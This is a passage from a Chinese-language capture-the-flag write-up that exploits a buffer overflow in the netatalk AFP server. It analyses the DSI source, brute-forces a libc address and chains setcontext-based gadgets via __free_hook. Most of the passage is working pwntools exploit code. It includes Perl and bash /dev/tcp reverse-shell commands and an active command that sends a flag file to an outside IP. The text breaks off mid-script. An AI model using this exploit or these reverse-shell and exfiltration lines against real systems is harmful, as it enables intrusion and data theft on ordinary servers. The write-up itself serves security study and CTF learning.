    <span class="k">if</span> <span class="p">((</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_init_buffer: OOM"</span><span class="p">);</span>
        <span class="n">AFP_PANIC</span><span class="p">(</span><span class="s">"OOM in dsi_init_buffer"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* dsi_peek() read ahead buffer, default is 12 * 300k = 3,6 MB (Apr 2011) */</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">dsireadbuf</span> <span class="o">*</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_init_buffer: OOM"</span><span class="p">);</span>
        <span class="n">AFP_PANIC</span><span class="p">(</span><span class="s">"OOM in dsi_init_buffer"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">start</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">;</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">eof</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">;</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">+</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">dsireadbuf</span> <span class="o">*</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>从代码中可以看出，commands指针指向一块malloc(server_quantum)分配的地址，即这是一块堆地址。但是，server_quantum的初始值是DSI_SERVQUANT_DEF，0x100000L，超过了brk的分配范围，因此是mmap分配的内存空间。通过本地调试，该地址相对于libc的地址的偏移，在同一个系统下是固定的，位于libc下方不远处： <img data-proofer-ignore data-src="/img/netatalk/malloc_addr.png" alt="malloc_addr" /> <img data-proofer-ignore data-src="/img/netatalk/mmap_addr.png" alt="mmap_addr" /> 网上部分wp认为，该地址即为泄露出的地址，只要通过爆破猜解出该地址，自然可以通过减去偏移获取libc地址。然而，这个爆破出来的地址，并不一定是commands指针所对应的地址，更不一定是mmap的基址。如果对于每一个自己从255向0爆破，那么最后爆破出来的地址是一个比commands更高的地址；如果从0向255爆破，那么最后爆破出来的地址是一个比commands更低的地址，并且还有可能比libc的地址还要低。只要这个地址是可写的，又正好在我们的爆破路径上，那么结果就可能会是它。这里我们先不管这么多，先爆破出来再说，具体之后怎么用，下面再讲。爆破代码如下：</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">bruteforce</span><span class="p">():</span>
    <span class="n">leak_addr</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
    <span class="n">flag_str</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&gt;I'</span><span class="p">,</span> <span class="n">FLAG_VAL</span><span class="p">)</span>
    <span class="c1"># num = 0
</span>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
        <span class="c1"># from 255 to 0 for each byte, get an address that is below libc_base
</span>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
            <span class="n">cur_byte</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">+</span> <span class="n">cur_byte</span>
            <span class="n">reply</span> <span class="o">=</span> <span class="n">replaceCommandPtr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">reply</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">continue</span>
            <span class="k">if</span> <span class="n">flag_str</span> <span class="ow">in</span> <span class="n">reply</span><span class="p">:</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'Find! {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
                <span class="n">leak_addr</span> <span class="o">+=</span> <span class="n">cur_byte</span>
                <span class="k">break</span>
    <span class="c1"># print(leak_addr)
</span>    <span class="n">mmap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>   <span class="c1"># 0x7fxxxxxfff, add 1
</span>    <span class="k">return</span> <span class="n">mmap_addr</span><span class="o">+</span><span class="mi">1</span>
</pre></table></code></div></div><p>这里我们选择了从255向0的方向爆破，目的是保证获取的地址一定比libc的地址更高，在libc之后。这样在之后计算libc地址的时候，只用考虑<strong>减去</strong>偏移即可，而不用考虑加上偏移的情况。最后将爆破出的地址+1是因为，我们从最低位的255开始爆破，结果肯定是0x7fxxxxxfff的形式，因为内存是分页的，一页4096（0x1000）字节，其性质肯定相同，不会出现在一页中即有可读又有可写的情况。加上1之后保证地址页对齐，方便后面定位libc基址。</p><p>这样对目标服务器进行爆破，爆破出的地址是：<code class="language-plaintext highlighter-rouge">0x7fa9bcc90000</code>。</p><h1 id="0x03-再次爆破">0x03 再次爆破</h1><p>上面爆破出来的地址，即使知道了目标系统内核版本，也很难确定其与libc之间的偏移，因为爆破的结果随机性很强，可能只是某个可写的内存区域而已。但是，上面的爆破过程已经保证该地址位于libc及mmap之后更高的地址之中，并且多次实验发现，在libc和这个mmap地址之后的内存空间，只剩下一个ld（再往后便是stack、vdso等的地址，位于更高的位置，在此不再考虑），也就是说，虽然地址不确定，但是内存的布局是确定的。而且，多次实验结果表明，libc基址到最后一个可访问地址之间的偏移在同一台机器上是固定的。如下图，在我ubuntu 18.04.6，内核版本4.9.0的vps中（按照题目环境模拟），加载题目提供的libc，偏移是0x61D000。而如果使用系统自带的libc，偏移可能在0xED6000。 <img data-proofer-ignore data-src="/img/netatalk/offset1.png" alt="offset1" /> <img data-proofer-ignore data-src="/img/netatalk/offset2.png" alt="offset2" /> 但是，不论什么系统，这个偏移的值不会太大，而内存页大小0x1000，因此，对于偏移值，我们可以从0开始，以0x1000为步长打exp，一直打到0x1000000。如果怕不保险，那就打到0xffff000，总有一次能够成功，即这次<code class="language-plaintext highlighter-rouge">leak_addr - offset == libc_base</code>。</p><h1 id="0x04-利用">0x04 利用</h1><p>现在已经知道如何获取libc的基地址了，剩下的就是具体的利用方法。参考了其他人的wp。</p><p>基本思路是：将commands指针覆盖为__free_hook的地址，之后想办法控参（控制rdi寄存器的内容），最后想办法调用free函数即可。在这里面，地址覆盖可以通过上述漏洞实现，调用free函数可以通过直接关闭socket来实现（关socket肯定会有调用free函数吧。。），重点在于如何控参。关于控参的方法，我之前没什么经验，这次学习，发现有人使用了类似SROP中的方法来实现，即调用setcontext函数来控制寄存器的内容，具体来说是从setcontext+53这个位置开始实现寄存器控制。在此记录一下这一过程。</p><h2 id="数据包构建">数据包构建</h2><p>根据源码分析AFP协议格式。协议消息分为header + payload，其中header的格式可以从源码中分析出：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>/* What a DSI packet looks like:
   0                               32
   |-------------------------------|
   |flags  |command| requestID     |
   |-------------------------------|
   |error code/enclosed data offset|
   |-------------------------------|
   |total data length              |
   |-------------------------------|
   |reserved field                 |
   |-------------------------------|

   CONVENTION: anything with a dsi_ prefix is kept in network byte order.
*/
</pre></table></code></div></div><p>本题的利用需要在同一个socket内发两个TCP数据包，第一个数据包的payload也分为两部分：cmd_header和cmd_payload，其中cmd_header由两个字节组成，第一个字节为cmd options，当值为DSIOPT_ATTNQUANT（0x01）时才能触发漏洞，第二个字节为cmd_payload长度，可控，使得memcpy越界。</p><p>第二个数据包的payload部分，第一个字节是function index，指向afp_switch函数数组中一个单元，设为0即可。构建数据包的代码如下：</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">createDSIHeader</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>  <span class="c1"># dsi_flags, DSIFL_REQUEST
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">command</span>  <span class="c1"># dsi_command
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x00</span><span class="s">'</span>  <span class="c1"># dsi_requestID
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># dsi_data
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;I"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># dsi_len
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># dsi_reserved
</span>    <span class="k">return</span> <span class="n">dsi_header</span>

<span class="k">def</span> <span class="nf">replaceCommandPtr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">cmd_payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># attn_quantum
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># datasize
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">FLAG_VAL</span><span class="p">)</span>  <span class="c1"># server_quantum
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># serverID &amp; clientID
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">addr</span>  <span class="c1"># **************** commands ptr ****************
</span>    <span class="n">cmd_header</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span>  <span class="c1"># DSIOPT_ATTNQUANT
</span>    <span class="n">cmd_header</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd_payload</span><span class="p">))</span>
    <span class="n">dsifunc_open</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x04</span><span class="s">'</span>  <span class="c1"># DSIFUNC_OPEN
</span>    <span class="n">dsi_header</span> <span class="o">=</span> <span class="n">createDSIHeader</span><span class="p">(</span><span class="n">dsifunc_open</span><span class="p">,</span> <span class="n">cmd_header</span> <span class="o">+</span> <span class="n">cmd_payload</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">dsi_header</span> <span class="o">+</span> <span class="n">cmd_header</span> <span class="o">+</span> <span class="n">cmd_payload</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">reply</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">reply</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">aaw</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">dsifunc_cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x04</span><span class="s">'</span>                          <span class="c1"># 
</span>    <span class="n">dsi_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>                          <span class="c1"># 
</span>    <span class="n">dsi_payload</span> <span class="o">+=</span> <span class="n">payload</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="n">createDSIHeader</span><span class="p">(</span><span class="n">dsifunc_cmd</span><span class="p">,</span> <span class="n">dsi_payload</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">dsi_header</span> <span class="o">+</span> <span class="n">dsi_payload</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="几个gadgets">几个gadgets</h2><h3 id="1-setcontext--53">1. setcontext + 53</h3><p><img data-proofer-ignore data-src="/img/netatalk/setcontext.png" alt="setcontext53" /> 上图可以看出，从setcontext+53开始的位置，对各个寄存器进行赋值，直到最后的retn。这个gadget的优势就是可以控各个寄存器的值。各个值的来源是rdi所指向的地址之后的部分内容，因此，还需要我们能够控制rdi寄存器以及rdi指向内存当中的内容。这在CTF堆题目中很好用，因为free函数的参数（rdi）正好是一块内存的起始地址。但是在如本题一样的real world中，free函数的参数内容通常较难控制。因此，我们在调用setcontext+53之前，还需要两个要求：<strong>rdi寄存器可控</strong>及<strong>rdi指向的内存空间可控</strong>。</p><h3 id="2-libc_dlopen_mode--56">2. libc_dlopen_mode + 56</h3><p>首先要获取一块可控的内存空间，并将其地址赋值给某个寄存器，为后续gadget拼接做准备。这个gadget的用途就是如此。该段代码如下：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mov     rax, cs:_dl_open_hook
call    qword ptr [rax]
</pre></table></code></div></div><p>不知道这个gadget最早是如何被发现的，猜测可能是_dl_open_hook这个全局变量正好位于__free_hook下方的不远处（+0x2BC0），在填充__free_hook的时候可以一并填充掉，用起来比较方便，并且正好有这个可用的gadget。gadget首先把_dl_open_hook内的值（并不是_dl_open_hook的地址）赋值给rax，然后以该值1为地址取值2，跳转到值2对应的地址。</p><h3 id="3-fgetpos64--207">3. fgetpos64 + 207</h3><p>有了上述gadget之后，要做的就是如何把rax赋值给rdi，这种gadget应该比较好找。<code class="language-plaintext highlighter-rouge">ROPgadget --binary libc-2.27.so --only "mov|call" | grep "mov rdi, rax"</code>可以找到一些相关的gadget，其中可用的如下：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mov rdi, rax ; call qword ptr [rax + 0x20]
mov rdi, rax ; call qword ptr [rax + 8]
</pre></table></code></div></div><p>第一个即为fgetpos64 + 207。至此，我们可以成功拼接出完整的ROP链，即：libc_dlopen_mode+56 -&gt; fgetpos64+207 -&gt; setcontext+53。</p><h2 id="布局">布局</h2><p>布局如图： <img data-proofer-ignore data-src="/img/netatalk/layout.png" alt="layout" /> 虽然gadget只有三个，但是布局还是有点复杂，需要注意的是：</p><ul><li>libc_dlopen_mode + 56处是把_dl_open_hook内的值赋值给rax，而不是其地址赋值给rax<li>因此赋值之后，rax=rdi的值为[_dl_open_hook] = _dl_open_hook+8<li>跳转到setcontext+53后，rdi的值是_dl_open_hook+8，距离sigframe的地址0x28字节，因此在用SigreturnFrame()布局sigframe时，需要跳过前0x28字节<li>布局sigframe时，rsp需要是一个可写的内存地址，为了保证system函数正确执行</ul><h1 id="0x05-exploit">0x05 exploit</h1><p>这里需要说明的一个地方是，本地的两轮爆破贼慢，通过题目提示的服务器内核版本可以看出来，服务器是linode申请的。因此，我也申请了一台linode的服务器，一开始是想搭一个完全相同的服务器环境来看偏移，但是后来发现偏移没什么用。在打exp的时候发现，在linode的vps上打pwnable的服务器，速度非常快，甚至比我在本地虚拟机打localhost:5566都要快得多。怀疑vps之间可能共用了同一台性能超强的宿主机？以下exp大概40s左右就出结果了。</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s">'error'</span><span class="p">)</span>
<span class="n">FLAG_VAL</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">R_IP</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'47.240.70.54'</span>
<span class="n">R_PORT</span> <span class="o">=</span> <span class="mi">8000</span>
<span class="c1"># CMD = b'perl -e \'use Socket;$i="47.240.70.54";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};\' \x00'
# CMD = b'bash -c "bash  -i&gt;&amp; /dev/tcp/%s/%d 0&lt;&amp;1" \x00' % (R_IP, R_PORT)
</span><span class="n">CMD</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'bash -c "cat /home/netatalk/flag &gt; /dev/tcp/%s/%d" </span><span class="se">\x00</span><span class="s">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">R_IP</span><span class="p">,</span> <span class="n">R_PORT</span><span class="p">)</span>
<span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
    <span class="n">IP</span> <span class="o">=</span> <span class="s">'127.0.0.1'</span>
    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">5566</span>
<span class="k">else</span><span class="p">:</span>
    <span class="c1"># IP = '172.104.74.53'
</span>    <span class="c1"># PORT = 5566
</span>    <span class="n">IP</span> <span class="o">=</span> <span class="s">'chall.pwnable.tw'</span>
    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">10002</span>
<span class="n">libc_bin</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">createDSIHeader</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>  <span class="c1"># dsi_flags, DSIFL_REQUEST
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">command</span>  <span class="c1"># dsi_command
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x00</span><span class="s">'</span>  <span class="c1"># dsi_requestID
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># dsi_data
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;I"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># dsi_len
</span>    <span class="n">dsi_header</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># dsi_reserved
</span>    <span class="k">return</span> <span class="n">dsi_header</span>


<span class="k">def</span> <span class="nf">replaceCommandPtr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">cmd_payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># attn_quantum
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># datasize
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">FLAG_VAL</span><span class="p">)</span>  <span class="c1"># server_quantum
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># serverID &amp; clientID
</span>    <span class="n">cmd_payload</span> <span class="o">+=</span> <span class="n">addr</span>  <span class="c1"># **************** commands ptr ****************
</span>    <span class="n">cmd_header</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span>  <span class="c1"># DSIOPT_ATTNQUANT
</span>    <span class="n">cmd_header</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd_payload</span><span class="p">))</span>
    <span class="n">dsifunc_open</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x04</span><span class="s">'</span>  <span class="c1"># DSIFUNC_OPEN
</span>    <span class="n">dsi_header</span> <span class="o">=</span> <span class="n">createDSIHeader</span><span class="p">(</span><span class="n">dsifunc_open</span><span class="p">,</span> <span class="n">cmd_header</span> <span class="o">+</span> <span class="n">cmd_payload</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">dsi_header</span> <span class="o">+</span> <span class="n">cmd_header</span> <span class="o">+</span> <span class="n">cmd_payload</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">reply</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">reply</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>


<span class="k">def</span> <span class="nf">bruteforce</span><span class="p">():</span>
    <span class="n">leak_addr</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
    <span class="n">flag_str</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&gt;I'</span><span class="p">,</span> <span class="n">FLAG_VAL</span><span class="p">)</span>
    <span class="c1"># num = 0
</span>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
        <span class="c1"># from 255 to 0 for each byte, get an address that is below libc_base
</span>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
            <span class="n">cur_byte</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">+</span> <span class="n">cur_byte</span>
            <span class="n">reply</span> <span class="o">=</span> <span class="n">replaceCommandPtr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">reply</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">continue</span>
            <span class="k">if</span> <span class="n">flag_str</span> <span class="ow">in</span> <span class="n">reply</span><span class="p">:</span>
                <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'Find! {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
                <span class="n">leak_addr</span> <span class="o">+=</span> <span class="n">cur_byte</span>
                <span class="k">break</span>
    <span class="c1"># print(leak_addr)
</span>    <span class="n">mmap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>   <span class="c1"># 0x7fxxxxxfff, add 1
</span>    <span class="k">return</span> <span class="n">mmap_addr</span><span class="o">+</span><span class="mi">1</span>


<span class="k">def</span> <span class="nf">aaw</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">dsifunc_cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x04</span><span class="s">'</span>           <span class="c1"># DSIFUNC_OPEN
</span>    <span class="n">dsi_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
    <span class="n">dsi_payload</span> <span class="o">+=</span> <span class="n">payload</span>
    <span class="n">dsi_header</span> <span class="o">=</span> <span class="n">createDSIHeader</span><span class="p">(</span><span class="n">dsifunc_cmd</span><span class="p">,</span> <span class="n">dsi_payload</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">dsi_header</span> <span class="o">+</span> <span class="n">dsi_payload</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">do_exploit</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">offset</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'libc_base: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_bin</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
    <span class="n">dl_open_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_bin</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_dl_open_hook'</span><span class="p">]</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_bin</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
    <span class="n">setcontext_53</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x520A5</span>
    <span class="s">'''
